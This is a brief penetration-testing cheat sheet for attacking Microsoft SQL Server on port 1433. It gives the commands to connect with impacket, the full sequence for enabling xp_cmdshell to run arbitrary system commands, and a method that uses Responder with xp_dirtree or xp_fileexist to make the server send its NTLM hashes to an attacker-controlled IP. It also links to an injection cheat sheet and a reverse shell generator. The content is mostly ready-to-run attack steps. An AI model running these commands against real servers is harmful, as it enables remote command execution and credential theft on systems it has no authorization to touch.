# Microsoft SQL Server
## Notes
If commands are not found or do not work, you may need to install or update it
The commands and tools used here were tested on Kali Linux (Rolling Edition)

## Port
1433

## Connecting
```bash
impacket-mssqlclient <Username>@<IP> -windows-auth
```

## RCE using `xp_cmdshell`
If the following command returns 1, the account has sysadmin privileges and can run remote commands via `xp_cmdshell`.
```bash
SELECT IS_SRVROLEMEMBER('sysadmin') #1
```
If you have sysadmin privileges, you can enable xp_cmdshell and run arbitrary commands by executing
```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell '<Command>';
```

## Capture NTLM hashes using Responder and `xp_dirtree` or `xp_fileexist`
If you do not have sysadmin privileges, you can use Responder with xp_dirtree or xp_fileexist to capture NTLM hashes.
```bash
sudo responder -I tun0 #another terminal

SELECT IS_SRVROLEMEMBER('sysadmin') #0
EXEC xp_dirtree '\\<IP>\<Share>' # or '//<IP>/<Share>'
# EXEC xp_fileexist '\\<IP>\<Share>' or '//<IP>/<Share>'
```

# Reference
[Microsoft SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

[Reverse shell generator](https://www.revshells.com/)
